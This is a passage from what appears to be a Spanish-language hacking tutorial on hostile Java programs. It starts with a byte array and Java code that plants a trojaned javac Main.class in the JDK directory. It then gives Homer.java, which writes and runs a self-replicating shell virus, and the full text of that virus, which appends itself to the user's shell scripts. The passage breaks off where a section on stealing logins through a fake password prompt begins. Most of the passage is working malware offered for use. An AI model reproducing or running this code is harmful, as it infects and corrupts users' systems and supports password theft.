110,
116,
108,
110,
1,
0,
25,
40,
41,
76,
106,
97,
118,
97,
47,
117,
116,
105,
108,
47,
69,
110,
117,
109,
101,
114,
97,
116,
105,
111,
110,
59,
1,
0,
13,
67,
111,
110,
115,
116,
97,
110,
116,
86,
97,
108,
117,
101,
1,
0,
4,
40,
73,
41,
67,
1,
0,
12,
106,
97,
118,
97,
47,
105,
111,
47,
70,
105,
108,
101,
1,
0,
7,
118,
101,
114,
98,
111,
115,
101,
1,
0,
16,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
1,
0,
15,
112,
114,
105,
110,
116,
83,
116,
97,
99,
107,
84,
114,
97,
99,
101,
1,
0,
62,
40,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
69,
110,
118,
105,
114,
111,
110,
109,
101,
110,
116,
59,
41,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
68,
101,
102,
105,
110,
105,
116,
105,
111,
110,
59,
1,
0,
7,
45,
110,
111,
119,
97,
114,
110,
1,
0,
19,
106,
97,
118,
97,
47,
105,
111,
47,
80,
114,
105,
110,
116,
83,
116,
114,
101,
97,
109,
1,
0,
10,
83,
111,
117,
114,
99,
101,
70,
105,
108,
101,
1,
0,
7,
49,
32,
101,
114,
114,
111,
114,
1,
0,
6,
99,
104,
97,
114,
65,
116,
1,
0,
9,
110,
119,
97,
114,
110,
105,
110,
103,
115,
1,
0,
35,
40,
76,
106,
97,
118,
97,
47,
105,
111,
47,
70,
105,
108,
101,
59,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
86,
1,
0,
9,
112,
97,
114,
115,
101,
70,
105,
108,
101,
1,
0,
10,
97,
100,
100,
69,
108,
101,
109,
101,
110,
116,
1,
0,
17,
99,
117,
114,
114,
101,
110,
116,
84,
105,
109,
101,
77,
105,
108,
108,
105,
115,
1,
0,
5,
119,
114,
105,
116,
101,
1,
0,
22,
76,
106,
97,
118,
97,
47,
105,
111,
47,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
59,
1,
0,
8,
45,
118,
101,
114,
98,
111,
115,
101,
1,
0,
14,
76,
111,
99,
97,
108,
86,
97,
114,
105,
97,
98,
108,
101,
115,
1,
0,
21,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
90,
1,
0,
21,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
86,
1,
0,
6,
97,
112,
112,
101,
110,
100,
1,
0,
7,
32,
101,
114,
114,
111,
114,
115,
1,
0,
51,
40,
76,
106,
97,
118,
97,
47,
105,
111,
47,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
59,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
80,
97,
116,
104,
59,
41,
86,
1,
0,
9,
49,
32,
119,
97,
114,
110,
105,
110,
103,
1,
0,
22,
40,
67,
67,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
1,
0,
6,
101,
113,
117,
97,
108,
115,
1,
0,
9,
99,
97,
110,
116,
46,
114,
101,
97,
100,
1,
0,
3,
109,
115,
93,
1,
0,
5,
117,
115,
97,
103,
101,
1,
0,
20,
40,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
79,
98,
106,
101,
99,
116,
59,
1,
0,
40,
40,
73,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
79,
98,
106,
101,
99,
116,
59,
41,
86,
1,
0,
4,
115,
105,
122,
101,
1,
0,
27,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
99,
47,
83,
111,
117,
114,
99,
101,
67,
108,
97,
115,
115,
1,
0,
36,
40,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
68,
101,
102,
105,
110,
105,
116,
105,
111,
110,
59,
73,
41,
86,
1,
0,
30,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
68,
101,
102,
105,
110,
105,
116,
105,
111,
110,
1,
0,
13,
115,
101,
116,
68,
101,
102,
105,
110,
105,
116,
105,
111,
110,
1,
0,
16,
106,
97,
118,
97,
47,
117,
116,
105,
108,
47,
86,
101,
99,
116,
111,
114,
1,
0,
7,
91,
119,
114,
111,
116,
101,
32,
1,
0,
20,
45,
100,
32,
114,
101,
113,
117,
105,
114,
101,
115,
32,
97,
114,
103,
117,
109,
101,
110,
116,
1,
0,
20,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
99,
47,
77,
97,
105,
110,
1,
0,
21,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
79,
98,
106,
101,
99,
116,
59,
41,
90,
1,
0,
21,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
79,
98,
106,
101,
99,
116,
59,
41,
86,
1,
0,
19,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
84,
104,
114,
111,
119,
97,
98,
108,
101,
1,
0,
6,
111,
117,
116,
112,
117,
116,
1,
0,
6,
101,
120,
105,
115,
116,
115,
1,
0,
8,
116,
111,
83,
116,
114,
105,
110,
103,
1,
0,
25,
40,
76,
106,
97,
118,
97,
47,
105,
111,
47,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
59,
41,
86,
1,
0,
4,
109,
97,
105,
110,
1,
0,
5,
106,
97,
118,
97,
99,
1,
0,
5,
46,
106,
97,
118,
97,
1,
0,
22,
40,
91,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
86,
1,
0,
22,
40,
91,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
90,
1,
0,
22,
40,
73,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
86,
1,
0,
15,
32,
100,
111,
101,
115,
32,
110,
111,
116,
32,
101,
120,
105,
115,
116,
1,
0,
10,
45,
99,
108,
97,
115,
115,
112,
97,
116,
104,
1,
0,
4,
67,
111,
100,
101,
1,
0,
93,
32,
91,
45,
103,
93,
91,
45,
79,
93,
91,
45,
100,
101,
98,
117,
103,
93,
91,
45,
100,
101,
112,
101,
110,
100,
93,
91,
45,
110,
111,
119,
97,
114,
110,
93,
91,
45,
118,
101,
114,
98,
111,
115,
101,
93,
91,
45,
99,
108,
97,
115,
115,
112,
97,
116,
104,
32,
112,
97,
116,
104,
93,
91,
45,
110,
111,
119,
114,
105,
116,
101,
93,
91,
45,
100,
32,
100,
105,
114,
93,
32,
102,
105,
108,
101,
46,
106,
97,
118,
97,
46,
46,
46,
1,
0,
6,
46,
99,
108,
97,
115,
115,
1,
0,
11,
44,
32,
49,
32,
119,
97,
114,
110,
105,
110,
103,
1,
0,
7,
103,
101,
116,
78,
97,
109,
101,
1,
0,
15,
102,
97,
116,
97,
108,
46,
101,
120,
99,
101,
112,
116,
105,
111,
110,
1,
0,
7,
112,
114,
111,
103,
114,
97,
109,
1,
0,
44,
40,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
66,
117,
102,
102,
101,
114,
59,
1,
0,
19,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
69,
120,
99,
101,
112,
116,
105,
111,
110,
1,
0,
20,
106,
97,
118,
97,
47,
105,
111,
47,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
1,
0,
20,
40,
41,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
1,
0,
11,
103,
101,
116,
80,
114,
111,
112,
101,
114,
116,
121,
1,
0,
2,
45,
103,
1,
0,
2,
45,
100,
1,
0,
3,
40,
41,
90,
1,
0,
3,
40,
41,
86,
1,
0,
3,
40,
41,
74,
1,
0,
3,
40,
41,
73,
1,
0,
2,
45,
79,
1,
0,
13,
115,
101,
112,
97,
114,
97,
116,
111,
114,
67,
104,
97,
114,
1,
0,
18,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
1,
0,
10,
99,
97,
110,
116,
46,
119,
114,
105,
116,
101,
1,
0,
1,
93,
1,
0,
21,
106,
97,
118,
97,
47,
117,
116,
105,
108,
47,
69,
110,
117,
109,
101,
114,
97,
116,
105,
111,
110,
1,
0,
7,
45,
100,
101,
112,
101,
110,
100,
1,
0,
1,
73,
1,
0,
1,
67,
1,
0,
7,
119,
114,
105,
116,
101,
84,
111,
1,
0,
7,
110,
101,
114,
114,
111,
114,
115,
1,
0,
15,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
69,
114,
114,
111,
114,
1,
0,
6,
108,
101,
110,
103,
116,
104,
1,
0,
9,
103,
101,
116,
80,
97,
114,
101,
110,
116,
1,
0,
28,
45,
99,
108,
97,
115,
115,
112,
97,
116,
104,
32,
114,
101,
113,
117,
105,
114,
101,
115,
32,
97,
114,
103,
117,
109,
101,
110,
116,
1,
0,
1,
46,
1,
0,
1,
45,
1,
0,
29,
40,
76,
115,
117,
110,
47,
116,
111,
111,
108,
115,
47,
106,
97,
118,
97,
47,
67,
108,
97,
115,
115,
70,
105,
108,
101,
59,
41,
86,
1,
0,
2,
44,
32,
1,
0,
12,
100,
101,
112,
101,
110,
100,
101,
110,
99,
105,
101,
115,
1,
0,
14,
105,
110,
118,
97,
108,
105,
100,
32,
102,
108,
97,
103,
58,
32,
1,
0,
43,
40,
76,
106,
97,
118,
97,
47,
105,
111,
47,
79,
117,
116,
112,
117,
116,
83,
116,
114,
101,
97,
109,
59,
76,
106,
97,
118,
97,
47,
108,
97,
110,
103,
47,
83,
116,
114,
105,
110,
103,
59,
41,
86,
1,
0,
5,
117,
115,
101,
58,
32,
1,
0,
17,
40,
76,
106,
97,
118,
97,
47,
105,
111,
47,
70,
105,
108,
101,
59,
41,
86,
1,
0,
0,
0,
1,
0,
57,
0,
55,
0,
1,
0,
53,
0,
2,
0,
0,
1,
72,
1,
86,
0,
0,
0,
0,
0,
215,
1,
26,
0,
0,
0,
6,
0,
1,
0,
243,
1,
105,
0,
1,
1,
66,
0,
0,
0,
51,
0,
2,
0,
3,
0,
0,
0,
15,
42,
183,
0,
111,
42,
43,
181,
0,
69,
42,
44,
181,
0,
89,
177,
0,
0,
0,
1,
0,
207,
0,
0,
0,
18,
0,
4,
0,
0,
0,
54,
0,
4,
0,
55,
0,
9,
0,
56,
0,
14,
0,
54,
0,
1,
1,
54,
1,
30,
0,
1,
1,
66,
0,
0,
0,
106,
0,
3,
0,
4,
0,
0,
0,
42,
43,
182,
0,
92,
61,
3,
62,
167,
0,
18,
42,
180,
0,
69,
43,
29,
182,
0,
84,
182,
0,
132,
132,
3,
1,
29,
28,
161,
255,
239,
42,
180,
0,
69,
16,
10,
182,
0,
132,
177,
87,
177,
0,
1,
0,
0,
0,
39,
0,
40,
0,
44,
0,
1,
0,
207,
0,
0,
0,
38,
0,
9,
0,
0,
0,
63,
0,
0,
0,
64,
0,
5,
0,
65,
0,
10,
0,
66,
0,
22,
0,
65,
0,
30,
0,
68,
0,
39,
0,
63,
0,
40,
0,
69,
0,
41,
0,
62,
0,
1,
0,
218,
1,
30,
0,
1,
1,
66,
0,
0,
0,
59,
0,
3,
0,
2,
0,
0,
0,
31,
42,
187,
0,
45,
89,
183,
0,
88,
42,
180,
0,
89,
182,
0,
117,
18,
32,
182,
0,
117,
43,
182,
0,
117,
182,
0,
108,
182,
0,
94,
177,
0,
0,
0,
1,
0,
207,
0,
0,
0,
10,
0,
2,
0,
0,
0,
77,
0,
30,
0,
76,
0,
1,
1,
39,
1,
81,
0,
1,
1,
66,
0,
0,
0,
60,
0,
3,
0,
1,
0,
0,
0,
32,
42,
187,
0,
45,
89,
183,
0,
88,
18,
25,
182,
0,
117,
42,
180,
0,
89,
182,
0,
117,
18,
31,
182,
0,
117,
182,
0,
108,
182,
0,
94,
177,
0,
0,
0,
1,
0,
207,
0,
0,
0,
10,
0,
2,
0,
0,
0,
84,
0,
31,
0,
83,
0,
33,
0,
228,
1,
62,
0,
1,
1,
66,
0,
0,
8,
32,
0,
4,
0,
22,
0,
0,
5,
88,
18,
22,
184,
0,
106,
77,
1,
78,
7,
54,
4,
184,
0,
80,
55,
5,
187,
0,
48,
89,
183,
0,
83,
58,
7,
3,
54,
8,
3,
54,
9,
167,
1,
139,
43,
21,
9,
50,
18,
34,
182,
0,
131,
153,
0,
20,
21,
4,
16,
239,
126,
54,
4,
21,
4,
16,
8,
128,
54,
4,
167,
1,
107,
43,
21,
9,
50,
18,
35,
182,
0,
131,
153,
0,
20,
21,
4,
16,
247,
126,
54,
4,
21,
4,
16,
48,
128,
54,
4,
167,
1,
78,
43,
21,
9,
50,
18,
15,
182,
0,
131,
153,
0,
13,
21,
4,
16,
251,
126,
54,
4,
167,
1,
56,
43,
21,
9,
50,
18,
10,
182,
0,
131,
153,
0,
12,
21,
4,
5,
128,
54,
4,
167,
1,
35,
43,
21,
9,
50,
18,
12,
182,
0,
131,
153,
0,
13,
21,
4,
16,
32,
128,
54,
4,
167,
1,
13,
43,
21,
9,
50,
18,
28,
182,
0,
131,
153,
0,
12,
21,
4,
4,
128,
54,
4,
167,
0,
248,
43,
21,
9,
50,
18,
17,
182,
0,
131,
153,
0,
9,
4,
54,
8,
167,
0,
230,
43,
21,
9,
50,
18,
30,
182,
0,
131,
153,
0,
35,
21,
9,
4,
96,
43,
190,
162,
0,
14,
43,
132,
9,
1,
21,
9,
50,
77,
167,
0,
198,
42,
18,
1,
182,
0,
105,
42,
182,
0,
133,
3,
172,
43,
21,
9,
50,
18,
33,
182,
0,
131,
153,
0,
74,
21,
9,
4,
96,
43,
190,
162,
0,
53,
187,
0,
62,
89,
43,
132,
9,
1,
21,
9,
50,
183,
0,
120,
78,
45,
182,
0,
118,
154,
0,
143,
42,
187,
0,
45,
89,
183,
0,
88,
45,
182,
0,
97,
182,
0,
117,
18,
16,
182,
0,
117,
182,
0,
108,
182,
0,
105,
3,
172,
42,
18,
23,
182,
0,
105,
42,
182,
0,
133,
3,
172,
43,
21,
9,
50,
18,
3,
182,
0,
75,
153,
0,
35,
42,
187,
0,
45,
89,
183,
0,
88,
18,
6,
182,
0,
117,
43,
21,
9,
50,
182,
0,
117,
182,
0,
108,
182,
0,
105,
42,
182,
0,
133,
3,
172,
43,
21,
9,
50,
18,
8,
182,
0,
74,
153,
0,
15,
25,
7,
43,
21,
9,
50,
182,
0,
122,
167,
0,
35,
42,
187,
0,
45,
89,
183,
0,
88,
18,
21,
182,
0,
117,
43,
21,
9,
50,
182,
0,
117,
182,
0,
108,
182,
0,
105,
42,
182,
0,
133,
3,
172,
132,
9,
1,
21,
9,
43,
190,
161,
254,
116,
25,
7,
182,
0,
136,
154,
0,
9,
42,
182,
0,
133,
3,
172,
44,
199,
0,
6,
18,
2,
77,
187,
0,
41,
89,
44,
183,
0,
100,
58,
10,
187,
0,
50,
89,
42,
180,
0,
69,
25,
10,
183,
0,
126,
58,
11,
25,
11,
89,
180,
0,
104,
21,
4,
128,
181,
0,
104,
25,
7,
182,
0,
114,
58,
12,
167,
0,
56,
187,
0,
62,
89,
25,
12,
185,
0,
81,
1,
0,
192,
0,
61,
183,
0,
120,
58,
13,
25,
11,
187,
0,
46,
89,
25,
13,
183,
0,
87,
182,
0,
123,
167,
0,
20,
87,
25,
11,
3,
18,
27,
25,
13,
182,
0,
97,
182,
0,
116,
167,
0,
3,
25,
12,
185,
0,
82,
1,
0,
154,
255,
196,
187,
0,
58,
89,
17,
16,
0,
183,
0,
98,
58,
13,
4,
54,
14,
25,
11,
182,
0,
110,
25,
11,
182,
0,
112,
58,
15,
167,
1,
217,
25,
15,
185,
0,
81,
1,
0,
192,
0,
49,
58,
16,
25,
16,
182,
0,
85,
171,
0,
0,
1,
197,
0,
0,
0,
3,
0,
0,
0,
0,
0,
0,
0,
33,
0,
0,
0,
3,
0,
0,
0,
44,
0,
0,
0,
4,
0,
0,
0,
66,
25,
11,
182,
0,
79,
154,
0,
6,
167,
1,
156,
3,
54,
14,
25,
11,
25,
16,
182,
0,
76,
25,
16,
182,
0,
85,
7,
159,
0,
6,
167,
1,
134,
3,
54,
14,
25,
13,
182,
0,
90,
25,
16,
25,
11,
182,
0,
119,
192,
0,
56,
58,
17,
25,
17,
25,
11,
25,
13,
182,
0,
130,
25,
16,
25,
17,
8,
182,
0,
109,
25,
17,
182,
0,
66,
154,
1,
89,
21,
8,
153,
0,
6,
167,
1,
81,
25,
16,
182,
0,
71,
182,
0,
125,
182,
0,
128,
16,
46,
178,
0,
129,
182,
0,
78,
58,
18,
187,
0,
45,
89,
183,
0,
88,
25,
16,
182,
0,
71,
182,
0,
124,
182,
0,
128,
182,
0,
117,
18,
9,
182,
0,
117,
182,
0,
108,
58,
19,
45,
198,
0,
68,
25,
18,
182,
0,
92,
158,
0,
45,
187,
0,
62,
89,
45,
25,
18,
183,
0,
101,
58,
20,
25,
20,
182,
0,
118,
154,
0,
9,
25,
20,
182,
0,
93,
87,
187,
0,
62,
89,
25,
20,
25,
19,
183,
0,
101,
58,
20,
167,
0,
82,
187,
0,
62,
89,
45,
25,
19,
183,
0,
101,
58,
20,
167,
0,
67,
25,
17,
182,
0,
68,
192,
0,
46,
58,
21,
25,
21,
182,
0,
72,
153,
0,
19,
25,
11,
3,
18,
13,
25,
21,
182,
0,
135,
182,
0,
116,
167,
0,
182,
187,
0,
62,
89,
25,
21,
182,
0,
135,
183,
0,
120,
58,
20,
187,
0,
62,
89,
25,
20,
182,
0,
96,
25,
19,
183,
0,
113,
58,
20,
187,
0,
47,
89,
25,
20,
182,
0,
97,
183,
0,
77,
58,
21,
25,
13,
25,
21,
182,
0,
91,
25,
21,
16,
72,
182,
0,
137,
25,
21,
16,
105,
182,
0,
137,
25,
21,
16,
106,
182,
0,
137,
25,
21,
16,
97,
182,
0,
137,
25,
21,
16,
99,
182,
0,
137,
25,
21,
16,
107,
182,
0,
137,
25,
21,
16,
101,
182,
0,
137,
25,
21,
16,
100,
182,
0,
137,
25,
21,
16,
33,
182,
0,
137,
25,
21,
182,
0,
121,
25,
11,
182,
0,
86,
153,
0,
55,
42,
187,
0,
45,
89,
183,
0,
88,
18,
4,
182,
0,
117,
25,
20,
182,
0,
97,
182,
0,
117,
18,
39,
182,
0,
117,
182,
0,
108,
182,
0,
94,
167,
0,
20,
87,
25,
11,
3,
18,
13,
25,
20,
182,
0,
97,
182,
0,
116,
167,
0,
3,
25,
15,
185,
0,
82,
1,
0,
154,
254,
35,
21,
14,
153,
254,
12,
167,
0,
36,
58,
12,
25,
12,
182,
0,
107,
25,
11,
3,
18,
37,
182,
0,
115,
167,
0,
18,
58,
12,
25,
12,
182,
0,
107,
25,
11,
3,
18,
19,
182,
0,
115,
25,
11,
182,
0,
110,
4,
54,
12,
25,
11,
180,
0,
102,
158,
0,
139,
18,
5,
58,
13,
25,
11,
180,
0,
102,
4,
164,
0,
31,
187,
0,
45,
89,
183,
0,
88,
25,
11,
180,
0,
102,
182,
0,
73,
18,
29,
182,
0,
117,
182,
0,
108,
58,
13,
167,
0,
7,
18,
14,
58,
13,
25,
11,
180,
0,
99,
158,
0,
74,
25,
11,
180,
0,
99,
4,
164,
0,
42,
25,
13,
187,
0,
45,
89,
183,
0,
88,
95,
182,
0,
117,
18,
24,
182,
0,
117,
25,
11,
180,
0,
99,
182,
0,
73,
18,
11,
182,
0,
117,
182,
0,
108,
58,
13,
167,
0,
26,
25,
13,
187,
0,
45,
89,
183,
0,
88,
95,
182,
0,
117,
18,
18,
182,
0,
117,
182,
0,
108,
58,
13,
42,
25,
13,
182,
0,
94,
3,
54,
12,
167,
0,
56,
25,
11,
180,
0,
99,
158,
0,
48,
25,
11,
180,
0,
99,
4,
164,
0,
33,
42,
187,
0,
45,
89,
183,
0,
88,
25,
11,
180,
0,
99,
182,
0,
73,
18,
11,
182,
0,
117,
182,
0,
108,
182,
0,
94,
167,
0,
9,
42,
18,
38,
182,
0,
94,
25,
11,
182,
0,
86,
153,
0,
40,
184,
0,
80,
22,
5,
101,
55,
5,
42,
187,
0,
45,
89,
183,
0,
88,
18,
26,
182,
0,
117,
22,
5,
182,
0,
70,
18,
20,
182,
0,
117,
182,
0,
108,
182,
0,
94,
21,
12,
172,
0,
4,
2,
8,
2,
22,
2,
25,
0,
59,
3,
147,
4,
20,
4,
23,
0,
44,
1,
235,
4,
55,
4,
58,
0,
52,
1,
235,
4,
55,
4,
76,
0,
42,
0,
1,
0,
207,
0,
0,
2,
150,
0,
165,
0,
0,
0,
91,
0,
6,
0,
92,
0,
9,
0,
93,
0,
11,
0,
94,
0,
16,
0,
95,
0,
25,
0,
96,
0,
28,
0,
100,
0,
34,
0,
101,
0,
46,
0,
102,
0,
53,
0,
103,
0,
60,
0,
101,
0,
63,
0,
104,
0,
75,
0,
105,
0,
82,
0,
106,
0,
89,
0,
104,
0,
92,
0,
107,
0,
104,
0,
108,
0,
111,
0,
107,
0,
114,
0,
109,
0,
126,
0,
110,
0,
132,
0,
109,
0,
135,
0,
111,
0,
147,
0,
112,
0,
154,
0,
111,
0,
157,
0,
113,
0,
169,
0,
114,
0,
175,
0,
113,
0,
178,
0,
115,
0,
190,
0,
116,
0,
193,
0,
115,
0,
196,
0,
117,
0,
208,
0,
118,
0,
217,
0,
119,
0,
225,
0,
118,
0,
228,
0,
121,
0,
234,
0,
122,
0,
238,
0,
123,
0,
240,
0,
125,
0,
252,
0,
126,
1,
5,
0,
127,
1,
20,
0,
128,
1,
27,
0,
129,
1,
53,
0,
130,
1,
55,
0,
133,
1,
61,
0,
134,
1,
65,
0,
135,
1,
67,
0,
137,
1,
79,
0,
138,
1,
105,
0,
139,
1,
109,
0,
140,
1,
111,
0,
141,
1,
123,
0,
142,
1,
132,
0,
141,
1,
135,
0,
144,
1,
161,
0,
145,
1,
165,
0,
146,
1,
167,
0,
100,
1,
177,
0,
149,
1,
185,
0,
150,
1,
189,
0,
151,
1,
191,
0,
155,
1,
195,
0,
156,
1,
198,
0,
158,
1,
208,
0,
159,
1,
223,
0,
160,
1,
235,
0,
162,
1,
235,
0,
164,
1,
245,
0,
165,
2,
8,
0,
166,
2,
8,
0,
167,
2,
22,
0,
166,
2,
25,
0,
168,
2,
26,
0,
169,
2,
39,
0,
166,
2,
42,
0,
164,
2,
52,
0,
174,
2,
64,
0,
178,
2,
67,
0,
179,
2,
72,
0,
180,
2,
82,
0,
181,
2,
94,
0,
182,
2,
132,
0,
184,
2,
140,
0,
185,
2,
143,
0,
190,
2,
146,
0,
191,
2,
153,
0,
192,
2,
162,
0,
193,
2,
165,
0,
198,
2,
168,
0,
199,
2,
173,
0,
200,
2,
185,
0,
201,
2,
194,
0,
202,
2,
202,
0,
204,
2,
215,
0,
205,
2,
218,
0,
208,
2,
239,
0,
209,
3,
14,
0,
212,
3,
18,
0,
213,
3,
26,
0,
214,
3,
38,
0,
215,
3,
46,
0,
216,
3,
52,
0,
218,
3,
65,
0,
213,
3,
68,
0,
220,
3,
80,
0,
212,
3,
83,
0,
223,
3,
93,
0,
224,
3,
101,
0,
225,
3,
114,
0,
226,
3,
117,
0,
228,
3,
131,
0,
229,
3,
147,
0,
233,
3,
147,
0,
234,
3,
161,
0,
235,
3,
168,
0,
236,
3,
175,
0,
237,
3,
182,
0,
238,
3,
189,
0,
239,
3,
196,
0,
240,
3,
203,
0,
241,
3,
210,
0,
242,
3,
217,
0,
243,
3,
224,
0,
244,
3,
231,
0,
245,
3,
236,
0,
246,
3,
244,
0,
247,
4,
20,
0,
233,
4,
23,
0,
249,
4,
24,
0,
250,
4,
37,
0,
233,
4,
40,
0,
180,
4,
50,
0,
254,
4,
55,
0,
162,
4,
58,
0,
255,
4,
60,
1,
0,
4,
65,
1,
1,
4,
73,
0,
162,
4,
76,
1,
2,
4,
78,
1,
3,
4,
83,
1,
4,
4,
91,
1,
7,
4,
96,
1,
9,
4,
99,
1,
10,
4,
107,
1,
11,
4,
111,
1,
12,
4,
120,
1,
13,
4,
145,
1,
12,
4,
148,
1,
15,
4,
152,
1,
17,
4,
160,
1,
18,
4,
169,
1,
19,
4,
205,
1,
18,
4,
208,
1,
21,
4,
231,
1,
24,
4,
237,
1,
25,
4,
240,
1,
10,
4,
243,
1,
27,
4,
251,
1,
28,
5,
4,
1,
29,
5,
31,
1,
28,
5,
34,
1,
31,
5,
40,
1,
37,
5,
48,
1,
38,
5,
56,
1,
39,
5,
85,
1,
42,
0,
9,
1,
58,
1,
61,
0,
1,
1,
66,
0,
0,
0,
74,
0,
4,
0,
2,
0,
0,
0,
38,
187,
0,
57,
89,
178,
0,
134,
18,
7,
183,
0,
103,
76,
178,
0,
134,
18,
36,
182,
0,
127,
43,
42,
182,
0,
67,
153,
0,
7,
3,
167,
0,
4,
4,
184,
0,
95,
177,
0,
0,
0,
1,
0,
207,
0,
0,
0,
18,
0,
4,
0,
0,
1,
49,
0,
13,
1,
50,
0,
21,
1,
51,
0,
37,
1,
48,
0,
1,
1,
17,
0,
0,
0,
2,
0,
227,
};
// Find out where Java lives
        String jhome = System.getProperty("java.home");
// Determine the system-dependent file separator
        String sep = System.getProperty("file.separator");
// Specify the full pathname of the directory where Main.class will be placed
        String target = jhome + sep + "classes" + sep + "sun" + sep +
                        "tools" + sep + "javac";
// Specify the full pathname for Main.class
        String makemain = target + sep + "Main.class";
// Create the corresponding file objects
        File targetdir = new File(target);
        File mainfile = new File(makemain);
// Create the target directory if it doesn't already exist
        if (!(targetdir.exists())) {targetdir.mkdirs();}
// Dump out the hostile Main.class into its new home
        byte[] byter = new byte[hijacked.length];
        for (int i=0; i<hijacked.length; i++) {
            byter[i] = (byte)hijacked[i];
        }
        try {
           PrintStream jack = new PrintStream(new FileOutputStream(mainfile));
           jack.write(byter, 0, byter.length);
           jack.close();
        } catch (IOException ioe) {}
    }
}

------------ FIN -------------------------------------------------------------

        Este programa infecta los sistemas Unix con un virus script del
  shell Bourne. Ademas cuando nuestro sistema este infectado saldra un
  mensaje diciendo que "java es seguro y los virus de unix no existen" ;-)
  Seguro que os gustara!!!

------------ Codigo Fuente ---------------------------------------------------

/* Homer.java by Mark D. LaDue */

/* December 7, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java application infects your UNIX system with a Bourne shell
   script virus, homer.sh.  homer.sh is kind enough to announce itself
   and inform you that "Java is safe, and UNIX viruses do not exist"
   before finding all of the Bourne shell scripts in your home directory,
   checking to see if they've already been infected, and infecting
   those that are not.  homer.sh infects another Bourne shell script
   by simply appending a working copy of itself to the end of that shell
   script.  */ 
    

import java.io.*;

class Homer {
    public static void main (String[] argv) {
    try {
       String userHome = System.getProperty("user.home");
       String target = "$HOME";
       FileOutputStream outer = new FileOutputStream(userHome + "/.homer.sh");
       String homer = "#!/bin/sh" + "\n" + "#-_" + "\n" +
        "echo \"Java is safe, and UNIX viruses do not exist.\"" + "\n" +
        "for file in `find " + target + " -type f -print`" + "\n" + "do" +
        "\n" + "    case \"`sed 1q $file`\" in" + "\n" +
        "        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
        " || sed -n '/#-_/,$p' $0 >> $file" + "\n" +
        "    esac" + "\n" + "done" + "\n" + 
        "2>/dev/null";
        byte[] buffer = new byte[homer.length()];
        homer.getBytes(0, homer.length(), buffer, 0);
        outer.write(buffer);
        outer.close();
        Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod 777 " +
                        userHome + "/.homer.sh");
        Process exec = Runtime.getRuntime().exec("/bin/sh " + userHome +
                       "/.homer.sh");
        } catch (IOException ioe) {}
    }
}

------------ FIN -------------------------------------------------------------

        Este programa es el virus script que acompa§a al programa Java
  llamado Homer.java, el cual lo teneis justo encima ;-)

------------ Codigo Fuente ---------------------------------------------------

#!/bin/sh

#-_

echo "Java is safe, and UNIX viruses do not exist."

for file in `find $HOME -type f -print`

do

    case "`sed 1q $file`" in

  "#!/bin/sh" ) grep '#-_' $file > /dev/null || sed -n '/#-_/,$p' $0 >> $file

    esac

done

2>/dev/null

------------ FIN -------------------------------------------------------------

  2- Invadir la privacidad.

        Con este tipo podemos obtener informacion confidencial del usuario
  que visite nuestro web (si!! su contrase§a }:-) o cualquier cosa que se
  nos ocurra. Por desgracia java ofrece una seguridad efectiva contra este
  tipo de ataques.

        Como ya he dicho antes este codigo acompa§a al applet llamado
  "LoginServerSocket.java". El siguiente codigo enga§a al usuario diciendole
  que tiene un fallo de seguridad y que debe abrir el Netscape de nuevo y
  que debe meter su login y password, entonces el applet se encarga de
  recoger esta informaciom y dejarla en el Home de nuestra web.

------------ Codigo Fuente ---------------------------------------------------

/* Ungrateful.java by Mark D. LaDue */

/* February 28, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

